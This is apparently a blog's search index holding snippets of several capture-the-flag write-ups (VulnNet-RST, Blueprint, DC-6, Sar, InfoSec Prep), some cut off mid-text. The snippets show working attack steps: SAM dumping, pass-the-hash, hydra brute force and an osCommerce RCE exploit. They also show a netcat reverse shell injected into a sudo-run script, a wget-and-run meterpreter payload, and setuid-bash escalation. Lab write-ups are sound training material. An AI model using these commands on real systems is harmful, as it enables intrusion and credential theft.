State========================================= ================================================================== =======SeIncreaseQuotaPrivilege Adjust memory quotas for a process EnabledSeMachineAccountPrivilege Add workstations to domain EnabledSeSecurityPrivilege Manage auditing and security log EnabledSeTakeOwnershipPrivilege Take ownership of files or other objects EnabledSeLoadDriverPrivilege Load and unload device drivers EnabledSeSystemProfilePrivilege Profile system performance EnabledSeSystemtimePrivilege Change the system time EnabledSeProfileSingleProcessPrivilege Profile single process EnabledSeIncreaseBasePriorityPrivilege Increase scheduling priority EnabledSeCreatePagefilePrivilege Create a pagefile EnabledSeBackupPrivilege Back up files and directories EnabledSeRestorePrivilege Restore files and directories EnabledSeShutdownPrivilege Shut down the system EnabledSeDebugPrivilege Debug programs EnabledSeSystemEnvironmentPrivilege Modify firmware environment values EnabledSeChangeNotifyPrivilege Bypass traverse checking EnabledSeRemoteShutdownPrivilege Force shutdown from a remote system EnabledSeUndockPrivilege Remove computer from docking station EnabledSeEnableDelegationPrivilege Enable computer and user accounts to be trusted for delegation EnabledSeManageVolumePrivilege Perform volume maintenance tasks EnabledSeImpersonatePrivilege Impersonate a client after authentication EnabledSeCreateGlobalPrivilege Create global objects EnabledSeIncreaseWorkingSetPrivilege Increase a process working set EnabledSeTimeZonePrivilege Change the time zone EnabledSeCreateSymbolicLinkPrivilege Create symbolic links EnabledSeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled*Evil-WinRM* PS C:\\Users\\a-whitehat\\Documents&amp;gt; whoami /groupsGROUP INFORMATION-----------------Group Name Type SID Attributes================================================== ================ ============================================ ===============================================================Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Administrators Alias S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group ownerNT AUTHORITY\\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled groupVULNNET-RST\\Domain Admins Group S-1-5-21-1589833671-435344116-4136949213-512 Mandatory group, Enabled by default, Enabled groupVULNNET-RST\\Denied RODC Password Replication Group Alias S-1-5-21-1589833671-435344116-4136949213-572 Mandatory group, Enabled by default, Enabled group, Local GroupNT AUTHORITY\\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled groupMandatory Label\\High Mandatory Level Label S-1-16-12288So we are domain admin, nice !Let use Impacket’s secretsdump.py to.. you guessed it, dump secrets !$ secretsdump.py vulnnet-rst/a-whitehat:bNdKVkjv3RR9ht@10.10.150.73Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation[*] Service RemoteRegistry is in stopped state[*] Starting service RemoteRegistry[*] Target system bootKey: 0xf10a2788aef5f622149a41b2c745f49a[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::Use administrator’s hash to do a pass-the-hash attack$ evil-winrm -i $ip -u administrator -H c2597747aa5e43022a3a3049a3c3b09d*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&amp;gt; whoamivulnnet-rst\\administrator*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&amp;gt; more ..\\desktop\\system.txtTHM{16f45e3934293a57645f8d7bf71d8d4c}Thanks for reading &amp;lt;3h3x" }, { "title": "Try Hack Me - Blueprint", "url": "/posts/thm-blueprint/", "categories": "tryhackme", "tags": "windows, cve", "date": "2022-01-14 00:00:00 -0500", "snippet": "Challenge descriptionhttps://tryhackme.com/room/blueprintBlueprint is an easy Windows box on TryHackMeReconnaissance / EnumerationPort scanning and service identification$ rustscan -a $ip -r 1-65535 -- -A -sC.----. .-. .-. .----..---. .----. .---. .--. .-. .-.| {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| || .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ |`-&#39; `-&#39;`-----&#39;`----&#39; `-&#39; `----&#39; `---&#39; `-&#39; `-&#39;`-&#39; `-&#39;The Modern Day Port Scanner.________________________________________: https://discord.gg/GFrQsGy :: https://github.com/RustScan/RustScan : --------------------------------------🌍HACK THE PLANET🌍[...]PORT STATE SERVICE REASON VERSION80/tcp open http syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)| http-methods:|_ Supported Methods: GET|_http-server-header: Microsoft-IIS/7.5135/tcp open msrpc syn-ack Microsoft Windows RPC139/tcp open netbios-ssn syn-ack Microsoft Windows netbios-ssn443/tcp open ssl/http syn-ack Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)| tls-alpn:|_ http/1.1|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28[...]445/tcp open microsoft-ds syn-ack Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)3306/tcp open mysql syn-ack MariaDB (unauthorized)8080/tcp open http syn-ack Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28| http-methods:| Supported Methods: GET HEAD POST OPTIONS TRACE|_ PotentiaThanks for reading &amp;lt;3h3xen unknown syn-ack49154/tcp open unknown syn-ack49158/tcp open unknown syn-ack49159/tcp open unknown syn-ack49160/tcp open unknown syn-ackService Info: Hosts: www.example.com, BLUEPRINT, localhost; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: 0s, deviation: 0s, median: -1s| p2p-conficker:| Checking for Conficker.C or higher...| Check 1 (port 41214/tcp): CLEAN (Timeout)| Check 2 (port 10095/tcp): CLEAN (Couldn&#39;t connect)| Check 3 (port 13542/udp): CLEAN (Failed to receive data)| Check 4 (port 25003/udp): CLEAN (Timeout)|_ 0/4 checks are positive: Host is CLEAN or ports are blocked| smb-security-mode:| account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-time:| date: 2022-01-14T12:57:00|_ start_date: 2022-01-14T12:54:00| smb2-security-mode:| 2.1:|_ Message signing enabled but not requiredIn short: 443/8080 : Web server running Apache 80 : Web server running IIS 3306 : MariaDB database 139/445 : Samba 135/49XXX : RPCSMB EnumerationStart by listing samba shares:$ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse $ipStarting Nmap 7.92 ( https://nmap.org ) at 2022-01-14 13:04 UTCNmap scan report for 10.10.0.86Host is up (0.27s latency).PORT STATE SERVICE445/tcp open microsoft-dsHost script results:| smb-enum-users:| BLUEPRINT\\Administrator (RID: 500)| Description: Built-in account for administering the computer/domain| Flags: Password does not expire, Normal user account| BLUEPRINT\\Guest (RID: 501)| Description: Built-in account for guest access to the computer/domain| Flags: Password not required, Password does not expire, Normal user account| BLUEPRINT\\Lab (RID: 1000)| Full name: Steve|_ Flags: Normal user account| smb-enum-shares:| account_used: guest| \\\\10.10.0.86\\ADMIN$:| Type: STYPE_DISKTREE_HIDDEN| Comment: Remote Admin| Anonymous access: &amp;lt;none&amp;gt;| Current user access: &amp;lt;none&amp;gt;| \\\\10.10.0.86\\C$:| Type: STYPE_DISKTREE_HIDDEN| Comment: Default share| Anonymous access: &amp;lt;none&amp;gt;| Current user access: &amp;lt;none&amp;gt;| \\\\10.10.0.86\\IPC$:| Type: STYPE_IPC_HIDDEN| Comment: Remote IPC| Anonymous access: READ| Current user access: READ/WRITE| \\\\10.10.0.86\\Users:| Type: STYPE_DISKTREE| Comment:| Anonymous access: &amp;lt;none&amp;gt;| Current user access: READ| \\\\10.10.0.86\\Windows:| Type: STYPE_DISKTREE| Comment:| Anonymous access: &amp;lt;none&amp;gt;|_ Current user access: READNmap done: 1 IP address (1 host up) scanned in 76.14 secondsAfter browsing all the shares accessible anonymously, there’s nothing really interestingWeb EnumerationPort 443There’s an OS Commerce online shop at https://2.2.2.2/oscommerce/2.3.4/catalogCheck for known exploit :$ searchsploit oscommerce | grep &#39;2.3.4&#39;osCommerce 2.3.4 - Multiple Vulnerabilities | php/webapps/34582.txtosCommerce 2.3.4.1 - &#39;currency&#39; SQL Injection | php/webapps/46328.txtosCommerce 2.3.4.1 - &#39;products_id&#39; SQL Injection | php/webapps/46329.txtosCommerce 2.3.4.1 - &#39;reviews_id&#39; SQL Injection | php/webapps/46330.txtosCommerce 2.3.4.1 - &#39;title&#39; Persistent Cross-Site Scripting | php/webapps/49103.txtosCommerce 2.3.4.1 - Arbitrary File Upload | php/webapps/43191.pyosCommerce 2.3.4.1 - Remote Code Execution | php/webapps/44374.pyosCommerce 2.3.4.1 - Remote Code Execution (2) | php/webapps/50128.pyExploitation &amp;amp;&amp;amp; Foothold &amp;amp;&amp;amp; Pwn$ python3 /usr/share/exploitdb/exploits/php/webapps/50128.py http://$ip:8080/oscommerce-2.3.4/catalog [*] Install directory still available, the host likely vulnerable to the exploit.[*] Testing injecting system command to test vulnerabilityUser: nt authority\\systemRCE_SHELL$ whoamint authority\\systemWe got a shell of the target machine as “nt authority/system” which mean we already own the machine:RCE_SHELL$ more c:\\users\\administrator\\desktop\\root.txt.txtTHM{aea1e3ce6fe7f89e10cea833ae009bee}Next we need to get the hash for ‘lab’ user and crack it. Since we already have a root foothold on the machine, we just need to export and copy SYSTEM/SAM into the site root directory:RCE_SHELL$ reg save HKLM\\SAM C:\\xampp\\htdocs\\oscommerce-2.3.4\\samThe operation completed successfully.RCE_SHELL$ reg save HKLM\\SYSTEM C:\\xampp\\htdocs\\oscommerce-2.3.4\\systemThe operation completed successfully.$ wget http://10.10.0.86:8080/oscommerce-2.3.4/system2022-01-14 13:39:08 (414 KB/s) - &#39;system&#39; saved [12804096/12804096]$ wget http://10.10.0.86:8080/oscommerce-2.3.4/sam2022-01-14 13:39:21 (25.0 KB/s) - &#39;sam&#39; saved [24576/24576]$ samdump2 ./system ./samAdministrator:500:aad3b435b51404eeaad3b435b51404ee:549a1bcb88e35dc18c7a0b0168631411:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450:::We have Lab’s NTLM hash, let’s crack this:$ echo &#39;30e87bf999828446a1c1209ddde4c450&#39; &amp;gt; hash.txt &amp;amp;&amp;amp; hashcat -m 0 -a 0 ./hash.txt /opt/wordlists/rockyou.txtGuess.Queue......: 1/1 (100.00%)Speed.#1.........: 11484.4 kH/s (0.18ms) @ Accel:1024 Loops:1 Thr:1 Vec:16Recovered........: 0/1 (0.00%) Digests$ echo &#39;30e87bf999828446a1c1209ddde4c450&#39; &amp;gt; hash.txt &amp;amp;&amp;amp; hashcat -m 0 -a 0 ./hash.txt /opt/wordlists/seclists/Passwords/xato-net-10-million-passwords.txtGuess.Queue......: 1/1 (100.00%)Speed.#1.........: 12110.0 kH/s (0.18ms) @ Accel:1024 Loops:1 Thr:1 Vec:16Recovered........: 0/1 (0.00%) DigestsWell.. let’s try a much more simple option :Thanks for reading &amp;lt;3h3x" }, { "title": "Vulnhub - DC: 6", "url": "/posts/vulnhub-dc-6/", "categories": "vulnhub", "tags": "linux, wordpress, sudo", "date": "2022-01-13 00:00:00 -0500", "snippet": "Challenge descriptionhttps://www.vulnhub.com/entry/dc-6,315/ DC-6 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing. This isn’t an overly difficult challenge so should be great for beginners. The ultimate goal of this challenge is to get root and to read the one and only flag. Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools. For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won’t give you the answer, instead, I’ll give you an idea about how to move forward.Reconnaissance / EnumerationPort scanning and service identification$ rustscan -a $ip -r 1-65535 -- -A -sCPORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)| ssh-hostkey:| 2048 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDDHiBBFUtpw1T9DZyoXpMp3kg25/RgmGZRFFmZuTfV9SJPxJCvrQXdM6P5GfFLFcgnLlcOBhBbv33N9HvWisycRypK0uLK26bntqfyTAFCdMXcud7fKNgRBxJdN8onwl4Hly3wzRBJxFWqTdD1RF8viYH4TYIs5+WLpN7KihosjpbwzPpOnbDQZUw7GdHvosV7dFI6IMcF57R4G5LzSgV66GACNGxRn72ypwfOMaVbsoxzCHQCJBvd8ULL0YeAFtNeHoyJ8tL3dZlu71Wt9ePYf7ZreO+en701iDqL6T/iyt3wwTDl7NwpZGj5+GrlyfRSFoNyHqdd0xjPmXyoHynp| 256 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBE+jke+7np4l7EWf0wgySSp3MtYFcI6klVOWm7tDjas8eDxc9jYOhR4uK7koa2CkQPDd18XJSt0yNAGQFBb7wzI=| 256 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAII1mnJveN8yJySEDhG8wjYqtSKmcYNdX5EVqzxYb92dP80/tcp open http syn-ack Apache httpd 2.4.25 ((Debian))|_http-server-header: Apache/2.4.25 (Debian)| http-methods:|_ Supported Methods: GET HEAD POST OPTIONS|_http-title: Wordy &amp;amp;#8211; Just another WordPress site|_http-generator: WordPress 5.1.1Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelWeb Enumeration$ ./h3xenumerator.sh -t $target -e .conf,.config,.bak,.backup,.swp,.old,.db,.sql,.asp,.aspx,.aspx~,.asp~,.py,.py~,.rb,.rb~,.php,.php~,.bak,.bkp,.cache,.cgi,.conf,.csv,.html,.inc,.jar,.js,.json,.jsp,.jsp~,.lock,.log,.rar,.old,.sql,.sql.gz,.sql.zip,.sql.tar.gz,.sql~,.swp,.swp~,.tar,.tar.bz2,.tar.gz,.txt,.wadl,.zip,.log,.xml,.js,.json,.jpg,.jpeg,.png,.gif,.bmp -w /opt/wordlists/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt -l 1Since it’s a Wordpress site, let’s run wpscan against it :$ wpscan --url http://wordy --api-token (REDACTED)[...][+] WordPress version 5.1.1 identified (Insecure, released on 2019-03-13). | Found By: Rss Generator (Passive Detection) | - http://wordy/index.php/feed/, &amp;lt;generator&amp;gt;https://wordpress.org/?v=5.1.1&amp;lt;/generator&amp;gt; | - http://wordy/index.php/comments/feed/, &amp;lt;generator&amp;gt;https://wordpress.org/?v=5.1.1&amp;lt;/generator&amp;gt; | | [!] 31 vulnerabilities identified:After going through the vulnerabilities, I decided to go on for now, but let’s keep those in mind just in caseThe homepage of the site says :At Wordy, we know just how important it is to have secure plugins, and for this reason, we endeavour to provide the most secure and up-to-date plugins that are available on the market.But after looking at /wp-content/plugin, it looks like there are no plugins installed.One cool thing about Wordpress is the ability to easily validate usernames since the login page tells us if the user we entered is valid or not.Let’s try to enumerate valid users:$ hydra -L /opt/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -p nopassword wordy http-post-form &quot;/wp-login.php:log=^USER^&amp;amp;pwd=^PASS^&amp;amp;wp-submit=Log+In&amp;amp;redirect_to=http%3A%2F%2Fwordy%2Fwp-admin%2F&amp;amp;testcookie=1:S=The password&quot;[...][80][http-post-form] host: 192.168.0.141 login: admin password: nopassword[80][http-post-form] host: 192.168.0.141 login: mark password: nopassword[80][http-post-form] host: 192.168.0.141 login: graham password: nopassword[80][http-post-form] host: 192.168.0.141 login: sarah password: nopassword[80][http-post-form] host: 192.168.0.141 login: jens password: nopasswordNow that we have the name of 5 valid users, let’s brute force the password for all of them. It’s gonna take a long time to go through rockyou for all of those users. Luckily for us, there’s a tip on the VM page : OK, this isn’t really a clue as such, but more of some “we don’t want to spend five years waiting for a certain process to finish” kind of advice for those who just want to get on with the job. cat rockyou.txt | grep k01 &amp;gt; passwords.txt That should save you a few years. ;-)$ cat /opt/wordlists/rockyou.txt | grep k01 &amp;gt; dc6passwords.txt$ cat &amp;lt;&amp;lt; EOF &amp;gt;&amp;gt; dc6users.txtcmdand heredoc&amp;gt; admincmdand heredoc&amp;gt; markcmdand heredoc&amp;gt; grahamcmdand heredoc&amp;gt; sarahcmdand heredoc&amp;gt; jenscmdand heredoc&amp;gt; EOF$ hydra -L dc6users.txt -P dc6passwords.txt wordy http-post-form &quot;/wp-login.php:log=^USER^&amp;amp;pwd=^PASS^&amp;amp;wp-submit=Log+In&amp;amp;redirect_to=http%3A%2F%2Fwordy%2Fwp-admin%2F&amp;amp;testcookie=1:F=The password&quot;[...][80][http-post-form] host: wordy login: mark password: helpdesk01We can now log in the admin page with this credential.The site use a plugin called “Activity Monitor”. This plugins seems to show an activity log. There’s something interesting in the log :Since User-Agent is a user controlled field, I tried to inject some PHP code, but it’s sanitized and doesn’t work.Next thing is the “Tools” tab with 2 tools, one to convert an IP address to integer and the other one to resolve the IP. The resolve tool mention using dig to resolve the IP : The lookup button will try to resolve an IP address to a host name. If dig is installed on the webserver it will also be used for the lookup.Let’s try to inject some OS commands:The tool is vulnerable to OS command injection.Exploitation &amp;amp;&amp;amp; FootholdSince the ui input is limited to 15 characters, we’re gonna have to intercept the request and add the payload :$ nc -lnvp 4444listening on [any] 4444 ...connect to [1.1.1.1] from (UNKNOWN) [2.2.2.2] 59614iduid=33(www-data) gid=33(www-data) groups=33(www-data)python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;export TERM=xtermexport SHELL=bashexport TERM=xterm-256colorstty rows 91 columns 190www-data@dc-6:/var/www/html/wp-admin$Privilege EscalationStart by enumerating home directorieswww-data@dc-6:/var/www/html/wp-admin$ ls -lRa /home/home:total 24drwxr-xr-x 6 root root 4096 Apr 26 2019 .drwxr-xr-x 22 root root 4096 Apr 24 2019 ..drwxr-xr-x 2 graham graham 4096 Apr 26 2019 grahamdrwxr-xr-x 2 jens jens 4096 Apr 26 2019 jensdrwxr-xr-x 3 mark mark 4096 Apr 26 2019 markdrwxr-xr-x 2 sarah sarah 4096 Apr 24 2019 sarah/home/graham:[...]/home/jens:total 28[...]-rwxrwxr-x 1 jens devs 50 Apr 26 2019 backups.sh/home/mark:total 28[...]drwxr-xr-x 2 mark mark 4096 Apr 26 2019 stuff/home/mark/stuff:total 12[...]-rw-r--r-- 1 mark mark 241 Apr 26 2019 things-to-do.txt/home/sarah:[...]www-data@dc-6:/var/www/html/wp-admin$ cat /home/jens/backups.sh#!/bin/bashtar -czf backups.tar.gz /var/www/htmlwww-data@dc-6:/var/www/html/wp-admin$ cat /home/mark/stuff/things-to-do.txtThings to do:- Restore full functionality for the hyperdrive (need to speak to Jens)- Buy present for Sarah&#39;s farewell party- Add new user: graham - GSo7isUM1D4 - done- Apply for the OSCP course- Buy new laptop for Sarah&#39;s replacementWhat we got : A backup script which compress the website directory A note with a password for the user grahamLet’s escalate to graham and check for sudo permissions:www-data@dc-6:/var/www/html/wp-admin$ su - grahamPassword: GSo7isUM1D4graham@dc-6:~$ iduid=1001(graham) gid=1001(graham) groups=1001(graham),1005(devs)graham@dc-6:~$ sudo -lMatching Defaults entries for graham on dc-6: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser graham may run the following commands on dc-6: (jens) NOPASSWD: /home/jens/backups.shWe can execute the backup script as ‘jens’ and since we are in the ‘devs’ group we have write permission on the script and we are going to abuse it :graham@dc-6:~$ echo &#39;nc 192.168.0.167 4445 -e /bin/bash&#39; &amp;gt;&amp;gt; /home/jens/backups.shgraham@dc-6:~$ sudo -u jens /home/jens/backups.shh3x@kalict:~$ nc -lnvp 4445listening on [any] 4445 ...connect to [192.168.0.167] from (UNKNOWN) [192.168.0.170] 56222jens@dc-6:~$ iduid=1004(jens) gid=1004(jens) groups=1004(jens),1005(devs)We are now escalated to ‘jens’ user and are able to run /usr/bin/nmap as root so we should be able to get a shell from this:jens@dc-6:~$ sudo -lMatching Defaults entries for jens on dc-6: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser jens may run the following commands on dc-6: (root) NOPASSWD: /usr/bin/nmapjens@dc-6:~$ echo &#39;os.execute(&quot;/bin/bash&quot;)&#39; &amp;gt;&amp;gt; /tmp/pe &amp;amp;&amp;amp; sudo nmap --script=/tmp/peStarting Nmap 7.40 ( https://nmap.org ) at 2022-01-14 14:32 AESTNSE: Warning: Loading &#39;/tmp/pe&#39; -- the recommended file extension is &#39;.nse&#39;.root@dc-6:/home/jens# id &amp;amp;&amp;amp; hostnameuid=0(root) gid=0(root) groups=0(root)dc-6root@dc-6:~# cat theflag.txtYb dP 888888 88 88 8888b. dP&quot;Yb 88b 88 888888 d8b Yb db dP 88__ 88 88 8I Yb dP Yb 88Yb88 88__ Y8P YbdPYbdP 88&quot;&quot; 88 .o 88 .o 8I dY Yb dP 88 Y88 88&quot;&quot; `&quot;&#39; YP YP 888888 88ood8 88ood8 8888Y&quot; YbodP 88 Y8 888888 (8)Congratulations!!!Hope you enjoyed DC-6. Just wanted to send a big thanks out there to all thosewho have provided feedback, and who have taken time to complete these littlechallenges.If you enjoyed this CTF, send me a tweet via @DCAU7.Thanks for reading &amp;lt;3h3x" }, { "title": "Vulnhub - Sar: 1", "url": "/posts/vulnhub-sar-1/", "categories": "vulnhub", "tags": "linux, cve, cron", "date": "2022-01-12 00:00:00 -0500", "snippet": "Challenge descriptionhttps://www.vulnhub.com/entry/sar-1,425/ Sar is an OSCP-Like VM with the intent of gaining experience in the world of penetration testing.Reconnaissance / EnumerationPort scanning and service identificationWe start by scanning the ports on this machine. We have only one open port$ rustscan -a x.x.x.x -r 1-65535 -- -A -sCPORT STATE SERVICE REASON VERSION80/tcp open http syn-ack Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)| http-methods:|_ Supported Methods: GET POST OPTIONS HEAD|_http-title: Apache2 Ubuntu Default Page: It worksWeb EnumerationThe web service show the default apache page at the root. Let’s do some enumeration to try and find more.We start with /robots.txt :sar2HTMLWhich leads us to a page which seem to be a web application named sar2html v3.2.1Let’s find out if it’s vulnerable :$ searchsploit sar2html---------------------------------------------------------------------------- --------------------------------- Exploit Title | Path---------------------------------------------------------------------------- ---------------------------------sar2html 3.2.1 - &#39;plot&#39; Remote Code Execution | php/webapps/49344.pySar2HTML 3.2.1 - Remote Command Execution | php/webapps/47204.txt---------------------------------------------------------------------------- ---------------------------------It looks like we can get RCE through this web applicationExploitationexploitdb points us to an exploit so let’s try it out :$ cp /usr/share/exploitdb/exploits/php/webapps/49344.py .$ python3 49344.pyEnter The url =&amp;gt; http://1.1.1.1/sar2HTMLCommand =&amp;gt; iduid=33(www-data) gid=33(www-data) groups=33(www-data)Command =&amp;gt;Having an RCE exploit in hands, the next step is to establish a foothold on the targetFoothold First we create a meterpreter payload which we serve with python’s http.server $ msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=1.1.1.1 LPORT=4444 -f elf -o mp$ python3 -m http.server Then we start our metasploit listener $ msfconsolemsf6 &amp;gt; use multi/handler[*] Using configured payload generic/shell_reverse_tcpmsf6 exploit(multi/handler) &amp;gt; set payload linux/x64/meterpreter/reverse_tcppayload =&amp;gt; linux/x64/meterpreter/reverse_tcpmsf6 exploit(multi/handler) &amp;gt; set LHOST eth0LHOST =&amp;gt; eth0msf6 exploit(multi/handler) &amp;gt; set LPORT 4444LPORT =&amp;gt; 4444msf6 exploit(multi/handler) &amp;gt; run[*] Started reverse TCP handler on 1.1.1.1:4444 Now we can download and execute the payload on the target through RCE exploit command line Command =&amp;gt; wget 1.1.1.1:8000/mp -O /tmp/mp &amp;amp;&amp;amp; chmod 777 /tmp/mp &amp;amp;&amp;amp; /tmp/mp &amp;amp;&amp;amp; Stabilize our new shell : [*] Sending stage (3012548 bytes) to 2.2.2.2[*] Meterpreter session 1 opened (1.1.1.1:4444 -&amp;gt; 2.2.2.2:41106 ) at 2022-01-13 05:20:53 +0000meterpreter &amp;gt; shellpython3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;export TERM=xtermexport SHELL=bashexport TERM=xterm-256colorstty rows 91 columns 190www-data@sar:~/html/sar2HTML$ ididuid=33(www-data) gid=33(www-data) groups=33(www-data We have foothold on the target as www-dataPrivilege EscalationNow it’s time to escalate our privilegesThere is a crontab that runs as root every 5 minutes :$ cat /etc/crontab*/5 * * * * root cd /var/www/html/ &amp;amp;&amp;amp; sudo ./finally.sh$ ls -l /var/www/htmltotal 32-rwxr-xr-x 1 root root 22 Oct 20 2019 finally.sh-rw-r--r-- 1 www-data www-data 10918 Oct 20 2019 index.html-rw-r--r-- 1 www-data www-data 21 Oct 20 2019 phpinfo.php-rw-r--r-- 1 root root 9 Oct 21 2019 robots.txtdrwxr-xr-x 4 www-data www-data 4096 Jan 13 10:49 sar2HTML-rwxrwxrwx 1 www-data www-data 30 Oct 21 2019 write.sh$ cat /var/www/html/finally.sh#!/bin/sh./write.sh$ cat /var/www/html/write.sh#!/bin/shtouch /tmp/gatewayWe dont have write permission on the job’s script but we do on the second script, write.sh. Let’s exploit this misconfiguration :$ echo &#39;chmod +s /bin/bash&#39; &amp;gt;&amp;gt; /var/www/html/write.sh$ cat write.sh#!/bin/shtouch /tmp/gatewaychmod +s /bin/bashWait for it …$ ls -l /bin/bash-rwsr-sr-x 1 root root 1113504 Jun 7 2019 /bin/bash/bin/bash now has the setuid bit so we can use it to escalate to root :$ /bin/bash -pbash-4.4# id &amp;amp;&amp;amp; hostnameuid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)sarThanks for reading &amp;lt;3h3x" }, { "title": "Vulnhub - InfoSec Prep OSCP", "url": "/posts/vulnhub-infosec-prep-oscp/", "categories": "vulnhub", "tags": "linux, ssh, enumeration", "date": "2022-01-11 00:00:00 -0500", "snippet": "Challenge descriptionhttps://www.vulnhub.com/entry/infosec-prep-oscp,508/ This box should be easy. This machine was created for the InfoSec Prep Discord Server (https://discord.gg/RRgKaep) as a give way for a 30d voucher to the OSCP Lab, Lab materials, and an exam attempt. The box was created with VMWare Workstation, but it should work with VMWare Player and Virtualbox. Upon booting up it should display an IP address. This is the target address based on whatever settings you have. You should verify the address just incase. Find the flag.txt in /root/ and submit it to the TryHarder bot on Discord to enter the give away. The command is only available for so long. So if you are just joining the server or doing the box for fun, the command won’t be there any longer at a later time. *Please do not publish any write ups for this box until August 7, 2020 as this is probably when the give away will end. After that, fair game!*A big thanks to Offensive Security for providing the OSCP voucher.* Box created by FalconSpy with the support of the staff at InfoSec Prep Discord ServerThis works better with VirtualBox rather than VMware. ## Changelog 2020/07/10 - v1.0.1 - Fixed IP issue 2020/07/11 - v1.0.0Reconnaissance / EnumerationPort scanning and service identificationWe start by scanning the ports on this machine. We have 3 open ports running SSH, HTTP and MySQL services.$ rustscan -a x.x.x.x -r 1-65535 -- -A -sCPORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 91:ba:0d:d4:39:05:e3:13:55:57:8f:1b:46:90:db:e4 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDTlNTlvI4qQLNU17b70iKB5xuJlNnZ3zMZeHzfG3H5TcsVNmgImTe4FjEez0e4lKqJvTMsxrPVFHTq6gqfYHwN0KN34x0dv0ngrc+wrrWNoHQrQQqeFuTZy0Tt6BY97082YpFvZfDAvAwJoutkyCxeBb1+C9Y7g6kQYXlNFOuHoq/2m6vki9yVW7Bu3IVeLryw/7pnwzb/tr3K86GEsGc8+87ZIyFrgE1Rca/Y1hD03Uk0s/Kpmi3hCybJwPIoB1WmO2Xz2US8xqzuefsX6UzRazFTQKlTCq5gTTkpNE5fJzS/WmvK7w79aoFJPmVBCXOSXkoe9uoi9a64OnsY0jF8ao7uOUJp84QIUyPRLuPXqlxXwZenqt5RKH6dXyw9tsV2Q3BvZwJwvStFjiQFIi2zIp5jmVcYxwqV4CTt7Ev0ybATE00YAfCoS5i2LJR+fquN9XkS4ay3p9qoZZW7Q4uujWfUUaSO/gYLiOTpbTOl4Smgzc+NvqFrUk1OxPttDSc=| 256 0f:35:d1:a1:31:f2:f6:aa:75:e8:17:01:e7:1e:d1:d5 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOX6nl2HC2/Prh0l8uVsnAzinDT2+rhj1VasPM8Df3ntzgb8XzQat7zC/nHm0v7yLWo/CjpI6pD+mrBh3P/wuqk=| 256 af:f1:53:ea:7b:4d:d7:fa:d8:de:0d:f2:28:fc:86:d7 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBefJyPm1sjN+QedhTj6S1CPbXQZEFXb58RICJh970R880/tcp open http syn-ack Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-generator: WordPress 5.4.2| http-robots.txt: 1 disallowed 